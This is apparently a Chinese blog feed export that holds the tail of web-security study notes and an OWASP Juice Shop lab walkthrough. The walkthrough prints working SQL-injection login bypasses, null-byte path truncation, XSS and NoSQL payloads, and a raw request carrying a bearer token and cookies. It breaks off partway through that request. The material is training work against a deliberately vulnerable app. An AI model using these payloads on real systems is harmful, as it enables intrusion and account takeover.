‘\1’代表用第一组结果填充<br>(3)调用函数过滤不严：<br>call_user_func()和array_map()等数十个函数有调用其他函数的功能 ，其中的一个为参数作为要调用的函数名，如果函数名可控，就可以调用意外的函数，还执行代码<br>2.动态代码执行<br>php的函数可以直接由字符串拼接。<br>例子：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">'a'</span>](<span class="variable">$_GET</span>[<span class="string">'b'</span>])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>意思是接受get请求的a参数作为函数，b参数作为函数的参数<br>3.Curly Syntax<br>执行花括号间的代码，并将结果给替换回去<br>例子<br>ls命令列出本地目录的文件<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$var</span>=<span class="string">"qian <span class="variable">$&#123;`ls`&#125;</span> ye"</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>4.<a href="https://www.anquanke.com/post/id/86452" target="_blank" rel="noopener">unserialize()导致代码执行</a><br>利用条件：<br>1.unserialize()参数用户可以控制<br>2.__destruct()函数或者   </p><p>__wakeup(0函数存在 </p><h1 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md" target="_blank" rel="noopener">命令执行漏洞</a></h1><p>可以执行的系统或者应用指令的漏洞。<br>审计时：注意system()、exec()、shell_exec()、passthru()、pcntl_exec()、popen()、proc_open()等函数<br>1.命令执行函数<br>2.反引号命令执行<br>反引号执行命令调用的是shell_exec()函数<br>3.命令的连接符 &amp;、 &amp;&amp;、 |、||<br>4.命令防注入函数<br>escapeshellcms()过滤整条命令<br>escapeshellarg() 过滤参数   </p><h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a><a href="http://blog.csdn.net/Liuhuaijin/article/details/77331419" target="_blank" rel="noopener">变量覆盖漏洞</a></h1><p>用户自定义的参数可以替换程序原有的变量值。<br>审计时：注意的函数extract()和parse_str()<br>import_request_variables()<br>1.import_request_variables<br>将get、post、cookie中的变量导入到全局，第二个参数没有指定将导致变量覆盖<br>相当于开启全局变量注册，在php4~4.10和php5~5.40可用，php5.4后被取消<br>2.parse_str()<br>用于解析url的query string<br>3.extract()<br>将变量从数组导入当前的符号表<br>4.register_globals=on<br>变量将自动赋值，不用初始化，php4.20之后默认为off<br>5.$$变量覆盖  </p><h1 id="逻辑处理漏洞"><a href="#逻辑处理漏洞" class="headerlink" title="逻辑处理漏洞"></a>逻辑处理漏洞</h1><p>程序逻辑错误导致的  </p><h2 id="1-等于与存在判断绕过"><a href="#1-等于与存在判断绕过" class="headerlink" title="1.等于与存在判断绕过"></a>1.等于与存在判断绕过</h2><p>1.in_arrray(）函数<br>判断一个值是否在某个数组中<br>举个例子：<br>/?qianye=1q<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$_GET</span>[<span class="string">'qianye'</span>],array(1,2,3,4)))</span><br><span class="line">&#123;</span><br><span class="line">  //执行语句</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>2.is_numeric函数<br>当传入参数为hex时直接通过并返回true,而mysql是可以枝江使用hex编码代替字符串明文的。虽然不能直接注入sql语句，但是可能存在二次注入和xss等漏洞隐患。<br>3.双等于和三等于<br>双等于在判断等于之前会先做变量类型转换，而三等于不会   </p><h2 id="2-越权访问"><a href="#2-越权访问" class="headerlink" title="2.越权访问"></a>2.<a href="https://mp.weixin.qq.com/s/ChiXtcrEyQeLkGOkm4PTog" target="_blank" rel="noopener">越权访问</a></h2><h2 id="3-支付漏洞"><a href="#3-支付漏洞" class="headerlink" title="3.支付漏洞"></a>3.<a href="https://mp.weixin.qq.com/s/w22omfxO8vU6XzixXWmBxg" target="_blank" rel="noopener">支付漏洞</a></h2><h2 id="4-密码重置漏洞"><a href="#4-密码重置漏洞" class="headerlink" title="4.密码重置漏洞"></a>4.<a href="https://mp.weixin.qq.com/s/Lynmqd_ieEoNJ3mmyv9eQQ" target="_blank" rel="noopener">密码重置漏洞</a></h2><h1 id="会话认证漏洞"><a href="#会话认证漏洞" class="headerlink" title="会话认证漏洞"></a><a href="">会话认证漏洞</a></h1><p>1.cookie攻击<br>2.session保持攻击</p><h1 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81/clickjacking.md" target="_blank" rel="noopener">点击劫持</a></h1><p>是一种视觉欺骗手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置。   </p><h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a><a href="https://github.com/JnuSimba/MiscSecNotes/tree/master/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">ssrf</a></h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）    </p><h1 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h1><p>客户端所提交的数据未经检查就让web服务器去执行。   </p><h2 id="1-xml外部实体注入"><a href="#1-xml外部实体注入" class="headerlink" title="1.xml外部实体注入"></a>1.<a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener">xml外部实体注入</a></h2><p>xml可扩展标识语言，主要用来传输数据，而非显示数据。   </p><h2 id="2-xpath注入"><a href="#2-xpath注入" class="headerlink" title="2.xpath注入"></a>2.<a href="http://www.freebuf.com/articles/web/23184.html" target="_blank" rel="noopener">xpath注入</a></h2><p>xpath即xml路径语言 </p><h2 id="3-jsonp注入"><a href="#3-jsonp注入" class="headerlink" title="3.jsonp注入"></a>3.<a href="http://www.freebuf.com/articles/web/126347.html" target="_blank" rel="noopener">jsonp注入</a></h2><p>JSON（JavaSript Object Notation）是一种轻量级的数据交换格式   </p><h1 id="加密算法与随机数"><a href="#加密算法与随机数" class="headerlink" title="加密算法与随机数"></a>加密算法与随机数</h1><p>常见的加密算法，为分组加密算法和流加密算法两种。<br>分组加密算法基于“分组”进行操作，代表算法有DES、3-DES、 Blowfish、 IDEA 、AES<br>流加密算法，每次只处理一个字节，密钥独立于消息之外，两者通过异或实现加密于解密，代表算法有RC4、ORYX、SEAL   </p><h2 id="1-Stream-Ciper-Attack"><a href="#1-Stream-Ciper-Attack" class="headerlink" title="1.Stream Ciper Attack"></a>1.Stream Ciper Attack</h2><p>1.Reused Key Attack<br>使用同一个密钥进行多次加密、解密。<br>假设有 密钥C,明文A,明文B,那么，XOR加密可表示为：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">E(A)=A xor C </span><br><span class="line">E(B)=B xor C</span><br></pre></td></tr></table></figure></p><p>密文是知道的，因此容易计算：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">E(A) xor E(B) =(A xor C ) xor(B xor C )=A xor B</span><br></pre></td></tr></table></figure></p><p>此时只要知道3个便可以推算出剩下一个，密钥C完全不需要。<br>2.Bit-flipping Attack  </p><p>攻击者在不知道明文的情况下，通过改变密文，使得明文按其需要的方式发生改变的攻击方式。<br>通过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">E(A) xor E(B) =A xor B</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A xor E(A) xor B= E(B)</span><br></pre></td></tr></table></figure></p><p>例子：<br>比如加入一个网站用cookie作为身份验证，cookie通过xor加密而来，明文假设为usenam+role ,便可通过注册一个账号，推导出管理员的cookie<br>常见解决方法，增加带有KEY的MAC,通过MAC验证密文是否被修改。通过哈希算法来实现的MAC，称为HMAC。<br>3.弱随机数iv. </p><h2 id="2-ECB模式缺陷"><a href="#2-ECB模式缺陷" class="headerlink" title="2.ECB模式缺陷"></a>2.ECB模式缺陷</h2><p>简单的分组加密，改变分组密文的顺序，将改变解密后的明文顺序；替换某个分组密文，解密后该对应分组的明文也会被替换，而其他分组不受影响。</p><h2 id="3-Padding-Oracle-Attack"><a href="#3-Padding-Oracle-Attack" class="headerlink" title="3.Padding Oracle Attack"></a>3.<a href="http://www.freebuf.com/articles/system/163756.html" target="_blank" rel="noopener">Padding Oracle Attack</a></h2><h2 id="4-伪随机数问题"><a href="#4-伪随机数问题" class="headerlink" title="4.伪随机数问题"></a>4.<a href="http://5alt.me/2017/06/php%E9%87%8C%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0/" target="_blank" rel="noopener">伪随机数问题</a></h2><p><a href="http://www.sjoerdlangkemper.nl/2016/02/11/cracking-php-rand/" target="_blank" rel="noopener">伪随机数的破解</a><br>伪随机数是由数学算法实现的，它真正随机的地方在于“种子”，种子一旦确定后，再通过同一伪随机数算法计算出来的随机数，其值是固定的，多次计算所得的值的顺序也是固定的。  </p><h2 id="5-Length-Extension-Attack"><a href="#5-Length-Extension-Attack" class="headerlink" title="5.Length Extension Attack"></a>5.<a href="http://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">Length Extension Attack</a></h2><h1 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a><a href="https://www.secpulse.com/archives/64088.html" target="_blank" rel="noopener">DDOS攻击</a></h1><p>利用合理的请求造成资源过载，导致服务不可用。 </p><p><br><br>粗略的整理一下，等以后接触更多了，再慢慢的补充。<br><br></p><p><br></p><p>参考文献:<br><a href="https://book.douban.com/subject/10546925/" target="_blank" rel="noopener">https://book.douban.com/subject/10546925/</a><br><a href="https://book.douban.com/subject/26673087/" target="_blank" rel="noopener">https://book.douban.com/subject/26673087/</a><br><a href="https://book.douban.com/subject/26348894/" target="_blank" rel="noopener">https://book.douban.com/subject/26348894/</a><br><a href="https://github.com/JnuSimba/MiscSecNotes" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes</a></p>]]></content>
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>owasp juice shop</title>
      <link href="/posts/6faad9f0.html"/>
      <url>/posts/6faad9f0.html</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>闲来无事，搭个漏洞小靶场，玩一玩。</p><a id="more"></a><h1 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h1><p>在ubuntu下安装<br>1.先安装docker<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sudo</span> apt-get install docker</span><br></pre></td></tr></table></figure></p><p>2.安装owasp juice shop<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$docker</span> pull bkimminich/juice-shop</span><br></pre></td></tr></table></figure></p><p>有点卡，下载失败可多次尝试<br>3.运行 juice shop<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$docker</span> run -d -p 3000:3000 bkimminich/juice-shop</span><br></pre></td></tr></table></figure></p><p>4.访问虚拟机地址加3000端口</p><h1 id="一颗星"><a href="#一颗星" class="headerlink" title="一颗星"></a>一颗星</h1><h2 id="Score-Board"><a href="#Score-Board" class="headerlink" title="Score Board"></a>Score Board</h2><p>在首页，查看源码，看了挺久，终于在购物篮的页面上看到了一个Scorer-Board的链接，点击进去，成功解决。</p><h2 id="Admin-Section"><a href="#Admin-Section" class="headerlink" title="Admin Section"></a>Admin Section</h2><p>这关要求找到管理员的登入界面，用御剑等扫描一下没成功，直接根据任务的英文要求，输入administration，成功解决一关，看来要仔细读题目。</p><h2 id="Confidential-Document"><a href="#Confidential-Document" class="headerlink" title="Confidential Document"></a>Confidential Document</h2><p>要求阅读机密文件。还是老思路先用扫描器扫一下还看一下有没有robots.txt，发现不行，到处找了，一下，偶然在<code>关于我们</code>的页面上发现了一些显眼的字眼 ，将其下载下来，一开始认为里面会有不可访问的页面，突然看到下载的链接<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/ftp/legal.md?md_debug=<span class="literal">true</span></span><br></pre></td></tr></table></figure></p><p>访问一下<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/ftp/</span><br></pre></td></tr></table></figure></p><p>成功</p><h2 id="Deprecated-Interface"><a href="#Deprecated-Interface" class="headerlink" title="Deprecated Interface"></a>Deprecated Interface</h2><p>在投诉的页面上，提交一个xml小文件即可。具体原因查看源代码。</p><h2 id="Error-Handling"><a href="#Error-Handling" class="headerlink" title="Error Handling"></a>Error Handling</h2><p>这关要求引发一个错误，在解决Confidential Document 这关时，访问机密文件时，就引发了。</p><h2 id="Five-Star-Feedback"><a href="#Five-Star-Feedback" class="headerlink" title="Five-Star Feedback"></a>Five-Star Feedback</h2><p>在administration的管理页面中，就有删除五颗星的评分，就可以。</p><h2 id="Redirects-Tier-1"><a href="#Redirects-Tier-1" class="headerlink" title="Redirects Tier 1"></a>Redirects Tier 1</h2><h2 id="XSS-Tier-1"><a href="#XSS-Tier-1" class="headerlink" title="XSS Tier 1"></a>XSS Tier 1</h2><p>实现xss，首先想到的是搜索框，直接输入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">"XSS"</span>)&lt;/script&gt;.</span><br></pre></td></tr></table></figure></p><h2 id="Zero-Stars"><a href="#Zero-Stars" class="headerlink" title="Zero Stars"></a>Zero Stars</h2><p>在联系我的页面上有个评价，评价时，使用bp抓包，修改一下就ok。</p><h1 id="两颗星"><a href="#两颗星" class="headerlink" title="两颗星"></a>两颗星</h1><h2 id="Basket-Access"><a href="#Basket-Access" class="headerlink" title="Basket Access"></a>Basket Access</h2><h2 id="Christmas-Special"><a href="#Christmas-Special" class="headerlink" title="Christmas Special"></a>Christmas Special</h2><p>在搜索框上，输入1’，出现报错<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"error"</span>: &#123;</span><br><span class="line">    <span class="string">"message"</span>: <span class="string">"SQLITE_ERROR: near \"'%'\": syntax error"</span>,</span><br><span class="line">    <span class="string">"stack"</span>: <span class="string">"SequelizeDatabaseError: SQLITE_ERROR: near \"'%'\": syntax error\n    at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n    at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n    at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n    at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)"</span>,</span><br><span class="line">    <span class="string">"name"</span>: <span class="string">"SequelizeDatabaseError"</span>,</span><br><span class="line">    <span class="string">"parent"</span>: &#123;</span><br><span class="line">      <span class="string">"errno"</span>: 1,</span><br><span class="line">      <span class="string">"code"</span>: <span class="string">"SQLITE_ERROR"</span>,</span><br><span class="line">      <span class="string">"sql"</span>: <span class="string">"SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"original"</span>: &#123;</span><br><span class="line">      <span class="string">"errno"</span>: 1,</span><br><span class="line">      <span class="string">"code"</span>: <span class="string">"SQLITE_ERROR"</span>,</span><br><span class="line">      <span class="string">"sql"</span>: <span class="string">"SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"sql"</span>: <span class="string">"SELECT * FROM Products WHERE ((name LIKE '%1'%' OR description LIKE '%1'%') AND deletedAt IS NULL) ORDER BY name"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>从报错的语句可以知道后台sql数据库查询语句。<br>deletedAt该列的值为空的才会显示，而我们要加的是2014年的商品，肯定deletedAt值不为空，所以页面上显示不出来，通过构造查询语句注释掉deletedAt IS NULL，即可看到2014年圣诞节的商品。<br>最终<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">')) --</span></span><br></pre></td></tr></table></figure></p><h2 id="Forgotten-Sales-Backup"><a href="#Forgotten-Sales-Backup" class="headerlink" title="Forgotten Sales Backup"></a>Forgotten Sales Backup</h2><p>只能下载md和pdf的文件，可以通过%00截断<br></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/ftp/coupons_2013.md.bak%2500.md</span><br></pre></td></tr></table></figure><h2 id="Login-Admin"><a href="#Login-Admin" class="headerlink" title="Login Admin"></a>Login Admin</h2><p>在administration的管理页面中，可以知道管理员的登入账号为<a href="mailto:admin@juice-sh.op" target="_blank" rel="noopener">admin@juice-sh.op</a>，弱口令猜测admin123,成功登入，解决此题和Password Strength</p><h2 id="Password-Strength"><a href="#Password-Strength" class="headerlink" title="Password Strength"></a>Password Strength</h2><p>上题的方法解决</p><h2 id="Reset-Jim’s-Password"><a href="#Reset-Jim’s-Password" class="headerlink" title="Reset Jim’s Password"></a>Reset Jim’s Password</h2><p>通过输入<code>jim@juice-sh.op</code> 邮箱，要社工查找<br>Your eldest siblings middle name?名，查找得到<br>George Samuel Kirk 输入Samuel，然后填密码即可。</p><h2 id="Weird-Crypto"><a href="#Weird-Crypto" class="headerlink" title="Weird Crypto"></a>Weird Crypto</h2><p>在联系我的页面中的评价中，填写base64编码即可。</p><h1 id="三颗星"><a href="#三颗星" class="headerlink" title="三颗星"></a>三颗星</h1><h2 id="Easter-Egg-Tier-1"><a href="#Easter-Egg-Tier-1" class="headerlink" title="Easter Egg Tier 1"></a>Easter Egg Tier 1</h2><p>在ftp下的 eastere.gg，然后下载，将其中的一段密文base64解密，在访问其解密后的路径即可</p><h2 id="Eye-Candy"><a href="#Eye-Candy" class="headerlink" title="Eye Candy"></a>Eye Candy</h2><p>开启JavaScript console 输入命令<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">document.getElementById(<span class="string">"theme"</span>).setAttribute(<span class="string">"href"</span>,<span class="string">"css/geo-bootstrap/swatch/bootstrap.css"</span>);</span><br></pre></td></tr></table></figure></p><h2 id="Forged-Feedback"><a href="#Forged-Feedback" class="headerlink" title="Forged Feedback"></a>Forged Feedback</h2><h2 id="Forgotten-Developer-Backup"><a href="#Forgotten-Developer-Backup" class="headerlink" title="Forgotten Developer Backup"></a>Forgotten Developer Backup</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/package.json.bak％2500.md将最终解决挑战。</span><br></pre></td></tr></table></figure><h2 id="Login-Bender"><a href="#Login-Bender" class="headerlink" title="Login Bender"></a>Login Bender</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bender@juice-sh.op<span class="string">'--</span></span><br></pre></td></tr></table></figure><h2 id="Login-Bjoern"><a href="#Login-Bjoern" class="headerlink" title="Login Bjoern"></a>Login Bjoern</h2><p>暴力破解哈希不可能。官方答案说解密的方法，就在登入页面上的源码中一个dist/juice-shop.min.js链接里。密码为邮箱的base64加密。</p><h2 id="Login-Jim"><a href="#Login-Jim" class="headerlink" title="Login Jim"></a>Login Jim</h2><p>万能密码绕过<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jim@juice-sh.op<span class="string">' or 1 and 1 --+</span></span><br></pre></td></tr></table></figure></p><h2 id="Misplaced-Signature-File"><a href="#Misplaced-Signature-File" class="headerlink" title="Misplaced Signature File"></a>Misplaced Signature File</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/suspicious_errors.yml％2500.md</span><br></pre></td></tr></table></figure><h2 id="NoSQL-Injection-Tier-1"><a href="#NoSQL-Injection-Tier-1" class="headerlink" title="NoSQL Injection Tier 1"></a>NoSQL Injection Tier 1</h2><p>要求让服务器休眠一段时间.<br>访问一下链接即可<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.239.128:3000/rest/product/sleep(100)/reviews</span><br></pre></td></tr></table></figure></p><h2 id="NoSQL-Injection-Tier-2"><a href="#NoSQL-Injection-Tier-2" class="headerlink" title="NoSQL Injection Tier 2"></a>NoSQL Injection Tier 2</h2><p>同时更新所有的评论<br><br>向<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.20.132:3000/rest/product/reviews</span><br></pre></td></tr></table></figure></p><p>提交patch请求。<br>body为<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123; <span class="string">"id"</span>: &#123; <span class="string">"<span class="variable">$ne</span>"</span>: -1 &#125;, <span class="string">"message"</span>: <span class="string">"NoSQL Injection!"</span> &#125;</span><br></pre></td></tr></table></figure></p><p>Headers为,其中Authorization,根据自己的去抓包值去修改。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">conent-type:application/json</span><br><span class="line">Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwNzY3MDQsImV4cCI6MTUyMTA5NDcwNH0.vSA_fSFw1-yrRLYJatnIKmJvXYgBtvdI5pZOI1UNCVZ6_qtQ-hS2ETsvm_gi1p_d3E39Czc-__2GTtaE582C9jlrAOxmYiDNuzeM9PHxa8kd7hb40EAs6srD17vE_HDlU0LE-4VBUScjLPoRXWjQXM8QFC3_D9Eyc6FAM--T8TQ</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p><h2 id="Payback-Time"><a href="#Payback-Time" class="headerlink" title="Payback Time"></a>Payback Time</h2><h2 id="Product-Tampering"><a href="#Product-Tampering" class="headerlink" title="Product Tampering"></a>Product Tampering</h2><h2 id="Reset-Bender’s-Password"><a href="#Reset-Bender’s-Password" class="headerlink" title="Reset Bender’s Password"></a>Reset Bender’s Password</h2><p>这道题需要社工，最后会查到<code>Stop&#39;n&#39;Drop</code>。</p><h2 id="Retrieve-Blueprint"><a href="#Retrieve-Blueprint" class="headerlink" title="Retrieve Blueprint"></a>Retrieve Blueprint</h2><p>下载一个想设计文件通过3d打印去打。<br>先下载一张图片。通过图片可知相机制造商为openscad，谷歌可知这个软件编辑的3d打印的格式为.stl，暴力破解<a href="http://192.168.239.128:3000/public/images/products/" target="_blank" rel="noopener">http://192.168.239.128:3000/public/images/products/</a>  该目录下爆破.stl。看源码也知道有个JuiceShop.stl文件。</p><h2 id="Typosquatting-Tier-1"><a href="#Typosquatting-Tier-1" class="headerlink" title="Typosquatting Tier 1"></a>Typosquatting Tier 1</h2><p>在ftp下载package.json.bak 文件并打开，找到epilogue-js吗，百度去搜一下原因。在联系我们的页面上，提交<code>epilogue-js</code>的评论</p><h2 id="Upload-Size"><a href="#Upload-Size" class="headerlink" title="Upload Size"></a>Upload Size</h2><p>在投诉那里先上传一个小于100kb的.pdf文件， 通过bp抓包，修改为大于100kb小于200kb的。就ok</p><h2 id="Upload-Type"><a href="#Upload-Type" class="headerlink" title="Upload Type"></a>Upload Type</h2><p>修改一下上一题的后缀名即可</p><h2 id="User-Credentials"><a href="#User-Credentials" class="headerlink" title="User Credentials"></a>User Credentials</h2><p>根据登入处的报错知道有 id,user,email字段<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;<span class="string">"error"</span>:&#123;<span class="string">"message"</span>:<span class="string">"SQLITE_ERROR: near \"c4ca4238a0b923820dcc509a6f75849b\": syntax error"</span>,<span class="string">"stack"</span>:<span class="string">"SequelizeDatabaseError: SQLITE_ERROR: near \"c4ca4238a0b923820dcc509a6f75849b\": syntax error\n at Query.formatError (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:423:16)\n at afterExecute (/juice-shop/node_modules/sequelize/lib/dialects/sqlite/query.js:119:32)\n at replacement (/juice-shop/node_modules/sqlite3/lib/trace.js:19:31)\n at Statement.errBack (/juice-shop/node_modules/sqlite3/lib/sqlite3.js:16:21)"</span>,<span class="string">"name"</span>:<span class="string">"SequelizeDatabaseError"</span>,<span class="string">"parent"</span>:&#123;<span class="string">"errno"</span>:1,<span class="string">"code"</span>:<span class="string">"SQLITE_ERROR"</span>,<span class="string">"sql"</span>:<span class="string">"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"</span>&#125;,<span class="string">"original"</span>:&#123;<span class="string">"errno"</span>:1,<span class="string">"code"</span>:<span class="string">"SQLITE_ERROR"</span>,<span class="string">"sql"</span>:<span class="string">"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"</span>&#125;,<span class="string">"sql"</span>:<span class="string">"SELECT * FROM Users WHERE email = ''' AND password = 'c4ca4238a0b923820dcc509a6f75849b'"</span>&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>在 <code>Christmas Special</code>这题上已经有过分析，要</p><h2 id="Vulnerable-Library"><a href="#Vulnerable-Library" class="headerlink" title="Vulnerable Library"></a>Vulnerable Library</h2><h2 id="XSS-Tier-2"><a href="#XSS-Tier-2" class="headerlink" title="XSS Tier 2"></a>XSS Tier 2</h2><p>实现存储行xss就要插入数据库，一开始在联系我们的评论界面上提交xss语句，进入后台查看，发现评论为空，全被过滤了，只好另寻他法。最后想到在注册用户那里，注册一个账户，页面上有js判断，不能直接插入，只好bp转包，将用户名改为 <code>&lt;script&gt;alert(&quot;XSS2&quot;)&lt;/script&gt;</code> ，返回数据包失败，从返回的消息，知道将双引号，加了反斜杠，最后构造<code>&lt;script&gt;alert(\&quot;XSS\&quot;)&lt;/script&gt;</code>,返回包成功，再访问<code>administration</code>页面，弹框成功。</p><h2 id="XSS-Tier-3"><a href="#XSS-Tier-3" class="headerlink" title="XSS Tier 3"></a>XSS Tier 3</h2><p>根本不使用前端应用程序执行持续的XSS攻击。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /api/Products HTTP/1.1</span><br><span class="line">Host: 192.168.20.132:3000</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6NywiZW1haWwiOiI0MzE3NzQ0MzdAcXEuY29tIiwicGFzc3dvcmQiOiI4ZWVkOWVkN2JjN2UxOGE4OTc1Y2E1YTM5MWUzMmEwYyIsImNyZWF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTgtMDMtMTQgMDQ6MDA6NDcuMjMwICswMDowMCJ9LCJpYXQiOjE1MjEwMzEwNjEsImV4cCI6MTUyMTA0OTA2MX0.VZz6FISGX8_U6FuaAl8e89cxhZtFX9sFRb-Dk17pvaMfNQB3_TloX5H-sS1pCqaxSfr3EYD6tQUkcKSpqNkIuurY6uGp8AATYJ-vYFDd-yoeSQZONda8KlufopMGSuWjsKO08XbxbcRNSqJw0Eb6hoWmaiIHQkgIskYBGTUnxqo</span><br><span class="line">Content-Length: 82</span><br><span class="line">Cookie: continueCode=QbNz3wepgLV0eBH4urh8tnc8IqT1iBf7uKtwIbT7ibuEI7f9ZABKn9jYlaxZ; io=QvKEDdlKHoHGbeCDAABM; email=431774437%40qq.com; 